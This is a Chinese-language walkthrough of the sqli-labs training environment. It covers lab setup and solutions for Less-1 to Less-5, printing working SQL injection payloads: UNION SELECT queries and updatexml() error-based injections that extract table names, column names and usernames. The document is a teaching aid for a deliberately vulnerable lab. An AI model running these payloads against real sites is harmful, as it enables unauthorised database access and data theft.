#SQLI和sqli-labs介绍

SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。

#Sqli-labs下载

Sqli-labs项目地址—Github获取：https://github.com/Audi-1/sqli-labs

#Sqli-labs安装

  • apache+mysql+php5.x
  • 我测试用的环境是 Ubuntu18.04

将之前下载的源码解压到web目录下/var/www/html下
修改/var/www/html/sqli-labs/sql-connections/db-creds.inc文件中的MySQL账号密码即可

访问 localhost/sqli-lbs/ ，点击Setup/reset Database for labs 即可创建所需数据库

##Less-1

访问http://192.168.2.103/sqli-labs/Less-1/

提示需要输入参数id以及值
输入?id=1回显如下信息，发现有返回信息的地方

首先使用'判断是否有注入，发现报错，判断是有注入的(肯定啊，毕竟这是练习注入的嘛)，报错信息有三个',判断id这个参数是用单引号'包住的。

于是可以构造语句进行注入，首先将1改为-1，使id参数查不出数据，那么这个数据回显的地方会回显我们想要查的数据，否则将会查id=1的数据并且回显。
接着用order by num来查询列数
payload为?id=-1' order by 3 -- #
其中'是为了闭合前面id参数的查询。 --和#均为注释符，个人使用习惯是将两个都加上

当order by 3时不报错，4时报错，判断列数为3，接着可以使用联合查询union爆库查需要的东西

构造payload?id=-1' union select 1,@@version,user() -- #
查询MySQL版本，以及用户

##Less-2

先试用'判断是否有注入

回显的错误信息里面只有一个',说明这个单引号是我们自己添加的，可以判断代码里面的查询语句中的id参数是一个数值，并没有引号包住

于是我们可以构造payload?id=-1 union select 1,@@version,user() -- #进行注入

##Less-3

老规矩先用'判断

于是可以构造payload?id=-1') union select 1,@@version,user() -- #进行注入

##Less-4

##Less-5

首先看下id=1的返回值是什么

只返回了You are in......,没有数据回显的地方
接着我们用'测试

这里返回了报错的信息，发现有三个单引号,这里可以判断id参数是用单引号包起来的。于是用payload?id=-1' union select 1,@@version,user() -- #进行注入

返回的结果是You are in......，原因就是第一步中的，这个页面没有任何回显的地方，无法用联合查询的方式获取信息。
emmmmmm 这里应该是报错注入。

于是构造构造payload用updatexml()函数进行报错注入

?id=1' and updatexml(0,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1)),0) -- #

0x7e ASCII转码 ~,只是作为分隔符使用，其它亦可(只填一个0也可)。
limit 3,1:该数据库的第三张表名，1不能改动，否则爆不出表名。
第一个concat查询出该库的所有表名
第二个concat在第一个的基础上用~分割表名
updatexml(xml_document,xPath string,new value)：第二个参数不符合xPath string格式，所以会报错，第一、三参数只要是数字就行。

查出表名之后可以接着构造语句查询列名
?id=1' and updatexml(0,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name='users' limit 4,1)),0) -- #

接着还能爆出具体数据
?id=1' and updatexml(0,concat(0x7e,(select concat(username) from users limit 7,1)),0) -- #
